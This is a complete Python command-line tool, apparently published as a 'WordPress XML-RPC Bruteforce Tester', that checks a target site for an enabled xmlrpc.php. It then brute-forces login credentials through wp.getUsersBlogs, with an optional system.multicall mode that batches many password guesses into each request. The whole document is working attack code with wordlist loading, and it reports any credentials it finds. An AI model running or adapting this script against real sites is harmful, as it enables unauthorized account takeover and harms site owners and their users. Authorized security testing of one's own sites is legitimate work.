#!/usr/bin/env python3

import requests
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

def banner():
    print(Fore.GREEN + """                                                                  
 __ __ _____ __        _____ _____ _____    _____         _       
|  |  |     |  |   ___| __  |  _  |     |  | __  |___ _ _| |_ ___ 
|-   -| | | |  |__|___|    -|   __|   --|  | __ -|  _| | |  _| -_|
|__|__|_|_|_|_____|   |__|__|__|  |_____|  |_____|_| |___|_| |___|
            by AnkhCorp
    """)

def check_xmlrpc(target_url):
    if not target_url.endswith('/xmlrpc.php'):
        if target_url.endswith('/'):
            target_url = target_url + 'xmlrpc.php'
        else:
            target_url = target_url + '/xmlrpc.php'
    
    print(Fore.WHITE + f"[*] Checking if XML-RPC is enabled at: {target_url}")
    
    try:
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 405 and "XML-RPC server accepts POST requests only" in response.text:
            print(Fore.YELLOW + "[+] XML-RPC is enabled and site is potentially vulnerable!")
            
            headers = {'Content-Type': 'application/xml'}
            data = """<?xml version="1.0" encoding="utf-8"?>
            <methodCall>
            <methodName>system.listMethods</methodName>
            <params></params>
            </methodCall>"""
            
            response = requests.post(target_url, headers=headers, data=data, timeout=10)
            
            if "wp.getUsersBlogs" in response.text:
                return target_url
            else:
                print(Fore.RED + "[-] Method wp.getUsersBlogs not available")
                return None
        else:
            print(Fore.RED + "[-] XML-RPC is not enabled or site is not WordPress")
            return None
    
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Connection error: {e}")
        return None

def try_login(target_url, username, password):
    headers = {'Content-Type': 'application/xml'}
    
    data = f"""<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{username}</value></param>
    <param><value>{password}</value></param>
    </params>
    </methodCall>"""
    
    try:
        response = requests.post(target_url, headers=headers, data=data, timeout=15)
        
        if "isAdmin" in response.text or "blogid" in response.text:
            return True, username, password
        else:
            return False, username, password
    
    except requests.exceptions.RequestException:
        return False, username, password

def bruteforce_single(target_url, username, password_list, delay=1):
    print(Fore.WHITE + f"[*] Starting bruteforce for user: {username}")
    
    for idx, password in enumerate(password_list):
        if idx > 0 and idx % 50 == 0:
            print(Fore.WHITE + f"[*] Attempt {idx}/{len(password_list)} for {username}")
        
        success, user, pwd = try_login(target_url, username, password)
        
        if success:
            print(Fore.GREEN + f"\n[+] CREDENTIALS FOUND: {user}:{pwd}")
            return user, pwd
        
        time.sleep(delay)
    
    print(Fore.RED + f"[-] No valid password found for {username}")
    return None, None

def bruteforce_multicall(target_url, username, password_list, batch_size=3, delay=1):
    print(Fore.WHITE + f"[*] Starting multicall bruteforce for user: {username}")
    
    for batch_start in range(0, len(password_list), batch_size):
        batch_passwords = password_list[batch_start:batch_start + batch_size]
        
        if batch_start > 0 and batch_start % 50 == 0:
            print(Fore.WHITE + f"[*] Attempt {batch_start}/{len(password_list)} for {username}")
        
        headers = {'Content-Type': 'application/xml'}
        
        xml_data = """<?xml version="1.0"?>
        <methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
        """
        
        for password in batch_passwords:
            call_xml = f"""
            <value><struct>
                <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name><value><array><data>
                    <value><array><data>
                        <value><string>{username}</string></value>
                        <value><string>{password}</string></value>
                    </data></array></value>
                </data></array></value></member>
            </struct></value>
            """
            xml_data += call_xml
        
        xml_data += "</data></array></value></param></params></methodCall>"
        
        try:
            response = requests.post(target_url, headers=headers, data=xml_data, timeout=30)
            
            if "isAdmin" in response.text or "blogid" in response.text:
                print(Fore.GREEN + "\n[+] Possible credential found in batch!")
                
                for password in batch_passwords:
                    success, user, pwd = try_login(target_url, username, password)
                    if success:
                        print(Fore.GREEN + f"\n[+] CREDENTIALS FOUND: {user}:{pwd}")
                        return user, pwd
            
            time.sleep(delay)
            
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Error in multicall request: {e}")
            time.sleep(delay * 2)
    
    print(Fore.RED + f"[-] No valid password found for {username}")
    return None, None

def read_file(file_path):
    # Try common encodings without verbose output
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding) as f:
                return [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            continue
        except FileNotFoundError:
            print(Fore.RED + f"[-] File not found: {file_path}")
            sys.exit(1)
    
    # Fallback to binary mode if all encodings fail
    try:
        result = []
        with open(file_path, 'rb') as f:
            for line in f:
                try:
                    decoded_line = line.decode('utf-8', errors='ignore').strip()
                    if decoded_line:
                        result.append(decoded_line)
                except:
                    continue
        
        if result:
            print(Fore.WHITE + f"[*] Loaded {len(result)} entries from {file_path}")
            return result
        else:
            print(Fore.RED + f"[-] Could not read file: {file_path}")
            sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"[-] Error reading file: {e}")
        sys.exit(1)

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='WordPress XML-RPC Bruteforce Tester')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://example.com/)')
    parser.add_argument('-u', '--username', help='Username to test')
    parser.add_argument('-U', '--userlist', help='File containing list of usernames')
    parser.add_argument('-p', '--password', help='Password to test')
    parser.add_argument('-P', '--passlist', help='File containing list of passwords')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between requests (seconds)')
    parser.add_argument('-m', '--multicall', action='store_true', help='Use system.multicall to test multiple passwords at once')
    parser.add_argument('-b', '--batch', type=int, default=3, help='Batch size for multicall (default: 3)')
    parser.add_argument('--max-passwords', type=int, default=0, help='Maximum number of passwords to test (0 = no limit)')
    
    args = parser.parse_args()
    
    if not ((args.username or args.userlist) and (args.password or args.passlist)):
        print(Fore.RED + "[-] You must provide a username/userlist and a password/passlist")
        parser.print_help()
        sys.exit(1)
    
    target_url = check_xmlrpc(args.target)
    if not target_url:
        print(Fore.RED + "[-] Could not continue with the test")
        sys.exit(1)
        
    usernames = [args.username] if args.username else read_file(args.userlist)
    passwords = [args.password] if args.password else read_file(args.passlist)
    
    if args.max_passwords > 0 and len(passwords) > args.max_passwords:
        print(Fore.WHITE + f"[*] Limiting to {args.max_passwords} passwords from {len(passwords)} available")
        passwords = passwords[:args.max_passwords]
    
    print(Fore.WHITE + f"[*] Testing {len(usernames)} user(s) with {len(passwords)} password(s)")
    
    for username in usernames:
        if args.multicall:
            username, password = bruteforce_multicall(target_url, username, passwords, 
                                                     batch_size=args.batch, delay=args.delay)
        else:
            username, password = bruteforce_single(target_url, username, passwords, delay=args.delay)
        
    
    print(Fore.WHITE + "[*] Bruteforce test completed")

if __name__ == "__main__":
    main()